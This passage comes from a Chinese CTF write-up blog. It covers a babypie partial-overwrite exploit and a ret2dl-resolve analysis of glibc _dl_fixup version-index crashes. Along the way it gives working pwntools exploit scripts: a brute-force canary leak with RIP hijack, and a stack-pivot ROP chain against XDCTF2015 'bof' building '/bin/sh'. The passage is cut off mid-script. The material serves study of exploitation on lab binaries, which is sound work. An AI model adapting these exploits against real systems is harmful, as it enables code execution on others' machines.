STDERR_FILENO;</span><br></pre></td></tr></table></figure><p>可以从代码中看出，如果希望将此报错信息输出至<code>stderr</code>，需要设置环境变量<code>LIBC_FATAL_STDERR_=1</code></p><p>而ctf-wiki上所说的</p><blockquote><p>没有出现无法看见报错信息这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况</p></blockquote><p>实际上就是环境提供者已经设置好了此环境变量</p><p>相关文章:  <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200</a></p><h1 id="Partial-Overwrite-1"><a href="#Partial-Overwrite-1" class="headerlink" title="Partial Overwrite"></a>Partial Overwrite</h1><p>同样的，记录几个坑点</p><p>这里以安恒杯 2018 年 7 月月赛的 babypie 为例</p><p>ctf-wiki上也讲的比较清楚了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/</a></p><p>在复现的时候，老问题又出现了，system函数起不来</p><p>于是我尝试调试(16分之一的概率我试了好久…脸是真的黑)</p><p>发现了还是老问题，rsp没有对齐</p><p>不清楚为啥的可以看我写的这篇 <a href="https://ph4ntonn.github.io/bypass-Canary.html">https://ph4ntonn.github.io/bypass-Canary.html</a></p><p>同时注意这里不可以在syscall前对齐，因为system函数校验canary的时候，是如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f9c8d1b81f7 &lt;do_system+679&gt;  mov    rcx, QWORD PTR [rsp+0x178]</span><br><span class="line">0x7f9c8d1b81ff &lt;do_system+687&gt;  xor    rcx, QWORD PTR fs:0x28</span><br></pre></td></tr></table></figure><p>所以必须在call之前就直接对齐</p><p>但是这里我并没有找到很好的办法可以在exp中对齐rsp</p><p>在<code>Ubuntu 16.04</code>，<code>glibc 2.23</code>下可以复现成功</p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&quot;./babypie&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn = process(<span class="string">&quot;./babypie&quot;</span>,timeout = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak canary</span></span><br><span class="line">        pwn.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">&#x27;a&#x27;</span> *<span class="number">40</span></span><br><span class="line"></span><br><span class="line">        pwn.sendline(payload)</span><br><span class="line">        pwn.recvuntil(<span class="string">&#x27;a&#x27;</span> *<span class="number">40</span>+<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">        canary = u64(pwn.recvn(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Canary is: &quot;</span>,<span class="built_in">hex</span>(canary)</span><br><span class="line">        old_rbp = u64(pwn.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot; old_rbp is: &quot;</span>, <span class="built_in">hex</span>(old_rbp)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># try hijack rip</span></span><br><span class="line">        pwn.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">40</span></span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += p64(old_rbp)</span><br><span class="line">        payload += <span class="string">&#x27;\x3e\xfa&#x27;</span> <span class="comment">#try \x3e\x?a</span></span><br><span class="line">        raw_input()</span><br><span class="line">        pwn.send(payload)</span><br><span class="line"></span><br><span class="line">        pwn.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pwn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>成功率看脸～</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl</title>
      <link href="ret2dl.html"/>
      <url>ret2dl.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ret2dl-What"><a href="#Ret2dl-What" class="headerlink" title="Ret2dl?What?"></a>Ret2dl?What?</h1><p>直接贴链接，不再赘述 <a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul><li>Ubuntu 18.04</li><li>glibc 2.27</li></ul><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><p>首先，我按照 <a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> 中的payload进行了调试，自行调整，一直到stage 4，大体都是ok的，原理也比较清晰易懂，修改的地方也不是很多</p><p>但是，在stage 4时，却一直无法成功，于是我先仔细研究了payload，发现和作者步骤过程基本一致，与ctf-wiki上也是大差不差，但是却一直报非法内存地址访问。</p><p>嘛，那就gdb大法呗～</p><h2 id="确定报错位置"><a href="#确定报错位置" class="headerlink" title="确定报错位置"></a>确定报错位置</h2><p>首先先确定了报错位置</p><p><img src="/image/ret2dl/error.png" alt="error"></p><p>可以看到，此时的edx所指向的内存地址是无法访问的，故而在<code>0xf7fd6fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</code> 尝试取值的过程中，程序崩溃退出</p><p>那么为何在payload几乎相同的情况下，却会发生这种问题呢，带着疑惑，继续向下看</p><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>其实一开始我是以为我哪里写错了，所以浪费了一些时间去校对代码，但是无果</p><p>于是只能用最直接的方法，看看glibc的实现，找到为何会出现这个问题</p><p>报错部分的源代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* This function is called through a special trampoline from the PLT the</span><br><span class="line">   first time each PLT entry is called.  We must perform the relocation</span><br><span class="line">   specified in the PLT of the given shared object, and return the resolved</span><br><span class="line">   function address to the trampoline, which will restart the original call</span><br><span class="line">   to that address.  Future calls will bounce directly from the PLT to the</span><br><span class="line">   function.  *&#x2F;</span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  const ElfW(Sym) *const symtab</span><br><span class="line">    &#x3D; (const void *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  const char *strtab &#x3D; (const void *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  const PLTREL *const reloc</span><br><span class="line">    &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  const ElfW(Sym) *refsym &#x3D; sym;</span><br><span class="line">  void *const rel_addr &#x3D; (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  lookup_t result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Sanity check that we&#39;re really looking at a PLT relocation.  *&#x2F;</span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   &#x2F;* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="line">      used don&#39;t look in the global scope.  *&#x2F;</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) &#x3D;&#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">  const ElfW(Half) *vernum &#x3D;</span><br><span class="line">    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">  version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  if (version-&gt;hash &#x3D;&#x3D; 0)</span><br><span class="line">    version &#x3D; NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过比对汇编与源代码，我找到了报错语句为<code>if (version-&gt;hash == 0)</code> ,也就是说在尝试获取<code>version</code>结构体中的<code>hash</code>成员值时出错了</p><p>那这个<code>version</code>又是什么？</p><p>这里要感谢这位师傅的分析，给了我一点启示 <a href="https://forum.90sec.com/t/topic/260">https://forum.90sec.com/t/topic/260</a> </p><p>总的来说，原理大概可以概括为，在<code>_dl_fixup</code>中，需要校验符号的版本(version)，而这个<code>version</code>值是这样取的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure><p>可以看到，ndx作为<code>l_versions</code>成员的下标，其取值与<code>sym</code>的取值十分相似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure><p>其中<code>symtab</code>就是<code>.dynsym</code>节的起始地址，而其中的<code>reloc-&gt;r_info</code>则是我们所控制的值，此值被同时用于<code>version</code>以及<code>sym</code>的取值</p><p>所以也就是说，在我们满足了劫持<code>sym</code>至我们伪造的<code>sym</code>结构体上的同时，我们也必须兼顾<code>version</code>的取值，如果我们所伪造的<code>reloc-&gt;r_info</code>值不恰当，那么就可能导致<code>version</code>取值出现错误</p><p>而这个<code>reloc-&gt;r_info</code>值实际上与我们在exp中向<code>.bss</code>节上写入payload的时候选择的初始偏移有关，故而包括ctf-wiki以及很多网上的payload中所谓的“向<code>bss+0x800</code>偏移处写入payload是为了防止<code>_dl_fixup</code>会引用位置较低的地方”这个解释是不完全正确的，实际上需要在<code>.bss</code>节上加一段偏移主要还是为了保证<code>reloc-&gt;r_info</code>能在一个合理的区间之内，使得<code>sym</code>以及<code>version</code>都能被正确的取值</p><p>而我们所希望的，就是使得<code>version</code>能够取值到<code>null</code>(具体可以详细看上面师傅的文章),为了达到这一点，我们就需要使得<code>ndx</code>的值尽可能为0(因为<code>l-&gt;l_versions[0]</code>一般为<code>null</code>)</p><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>那么，我就来详细分析一下步骤，以及如何尽可能保证<code>ndx</code>的值能够取到0</p><p>首先，在向<code>.bss</code>节上写入payload的时候选择的初始偏移越大，意味着我们所伪造的<code>sym</code>结构体相对于<code>.dynsym</code>节的起始位置的偏移距离也会越大</p><p>这一偏移距离与我们所伪造的<code>reloc-&gt;r_info</code>值息息相关</p><p>而<code>reloc-&gt;r_info</code>值则关系到了<code>ndx</code>的值</p><p>有关<code>ndx</code>取值代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx &#x3D; vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br></pre></td></tr></table></figure><p>对应的汇编代码如下，其中<code>esi</code>的值<code>0x269</code>是我们伪造的<code>reloc-&gt;r_info</code>的值，<code>edx</code>是<code>.gnu.version</code>的起始地址，并且此时选择的<code>.bss</code>的初始偏移距离为<code>0x800</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x080482d8</span><br><span class="line">$esi   : 0x269</span><br><span class="line">......</span><br><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br><span class="line">0xf7f45fde &lt;_dl_fixup+110&gt;  and    edx, 0x7fff</span><br></pre></td></tr></table></figure><p>当上面的代码执行完成后，<code>edx</code>的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0x300e   </span><br></pre></td></tr></table></figure><p>此时<code>edx</code>的值实际上就是<code>ndx</code>的值</p><p>当前<code>edx+esi*2</code>的值为<code>0x80487aa</code>，其指向的内存空间布局如下，可以看到<code>0x80487aa</code>处双字节数据即<code>0x300e</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">8048714 00000000 20000000 68000000 d6fdffff  .... ...h.......</span><br><span class="line">8048724 46000000 00410e08 8502420d 05448303  F....A....B..D..</span><br><span class="line">8048734 7ec5c30c 04040000 38000000 8c000000  ~.......8.......</span><br><span class="line">8048744 f8fdffff a7000000 00440c01 00471005  .........D...G..</span><br><span class="line">8048754 02750045 0f037574 06100702 757c1003  .u.E..ut....u|..</span><br><span class="line">8048764 02757802 90c10c01 0041c341 c741c543  .ux......A.A.A.C</span><br><span class="line">8048774 0c040400 48000000 c8000000 70feffff  ....H.......p...</span><br><span class="line">8048784 5d000000 00410e08 8502410e 0c870341  ]....A....A....A</span><br><span class="line">8048794 0e108604 410e1483 054e0e20 690e2441  ....A....N. i.$A</span><br><span class="line">80487a4 0e28440e 2c440e30 4d0e2047 0e1441c3  .(D.,D.0M. G..A.</span><br><span class="line">80487b4 0e1041c6 0e0c41c7 0e0841c5 0e040000  ..A...A...A.....</span><br><span class="line">80487c4 10000000 14010000 84feffff 02000000  ................</span><br><span class="line">80487d4 00000000 00000000               </span><br></pre></td></tr></table></figure><p>此时程序的整体内存空间布局如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure><p>可以看到<code>0x80487aa</code>落在了下面这页上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br></pre></td></tr></table></figure><p>而我们都知道，内存页未被使用的空间均被<code>0</code>填充</p><p>故而我们可以从上面得到一个信息，从<code>0x80487db</code>-<code>0x08049000</code>这一段区间内，都被0所填充</p><p>那么如果我们可以控制<code>edx+esi*2</code>的值落在这一区间，我们就可以保证<code>ndx</code>的值为0，从而使得<code>version</code>为<code>null</code></p><p>而现在我们的ndx并不是<code>0</code>，所以我们先保留上述观点，继续看下去</p><p>接着执行如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version &#x3D; &amp;l-&gt;l_versions[ndx];</span><br></pre></td></tr></table></figure><p>对应的汇编代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0xf7f5e940  →  0x00000000</span><br><span class="line">$edx   : 0x300e0</span><br><span class="line">......</span><br><span class="line">0xf7f45fe4 &lt;_dl_fixup+116&gt;  shl    edx, 0x4</span><br><span class="line">0xf7f45fe7 &lt;_dl_fixup+119&gt;  add    edx, DWORD PTR [eax+0x170]</span><br><span class="line">0xf7f45fed &lt;_dl_fixup+125&gt;  mov    ebx, DWORD PTR [edx+0x4]</span><br></pre></td></tr></table></figure><p>当前<code>eax+0x170</code>中保存的地址是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;wx $eax+0x170</span><br><span class="line">0xf7fb4ab0:0xf7f873f0       </span><br></pre></td></tr></table></figure><p>第二句汇编执行完成后，<code>edx</code>的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0xf7fcb6b0</span><br></pre></td></tr></table></figure><p>此时内存布局是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure><p>可以看到此时<code>edx</code>的值已经处在了无法访问的内存区域，故而当执行到第三句汇编时，程序就会崩溃</p><p>综上所述，我们可以知道，我们选择的<code>.bss</code>节的初始偏移的大小应当严格控制，必须使偏移的大小能够让如下语句中的<code>edx+esi*2</code>落在规定的区间内，否则就会导致错误(当然，如果没有落在规定区间内，也有几率成功，因为基于上面<code>edx+esi*2</code>所指向的部分内存空间,我们可以看到存在一些双字节数据为<code>0x0000</code>,当<code>edx+esi*2</code>指向的数据为这些特殊位置时，也可以成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br></pre></td></tr></table></figure><p>我们也可以通过计算，得出<code>.bss</code>至少应当被抬高的偏移值</p><p>由于<code>edx+esi*2</code>与<code>.gnu.version</code>节的起始地址之间最小的距离应当为<code>0x80487db-0x80482d8=0x503</code></p><p>所以此时<code>esi</code>应当为<code>0x503/0x2=0x282</code>(向上取整)</p><p>也就是说，我们伪造的<code>reloc-&gt;r_info</code>最小值应当为<code>0x282</code></p><p>反推最小抬高距离(在我的payload情况下),<code>0x80481cc</code>+<code>0x10</code>*<code>0x282</code>-<code>0x804a000</code>-<code>0x50</code>=<code>0x99c</code></p><p>其中<code>0x80481cc</code>为<code>.dynsym</code>节的起始地址，<code>0x804a000</code>为<code>.bss</code>节的起始地址,<code>0x50</code>为已构造的payload的长度</p><p>附上我的最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&#39;bof&#39;)</span><br><span class="line">r &#x3D; process(&#39;.&#x2F;bof&#39;)</span><br><span class="line">rop &#x3D; ROP(&#39;.&#x2F;bof&#39;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line">bss_addr &#x3D; elf.bss()</span><br><span class="line"></span><br><span class="line">readplt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">writeplt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"></span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">stack_size &#x3D; 0x99c</span><br><span class="line">base_stage &#x3D; bss_addr + stack_size</span><br><span class="line">### padding</span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * offset</span><br><span class="line">payload +&#x3D; p32(readplt)</span><br><span class="line">payload +&#x3D; p32(0x08048649) #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(100)</span><br><span class="line">payload +&#x3D; p32(0x0804864b) #pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(0x08048465)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">plt0 &#x3D; elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr</span><br><span class="line">rel_plt &#x3D; elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr</span><br><span class="line">dynsym &#x3D; elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr</span><br><span class="line">dynstr &#x3D; 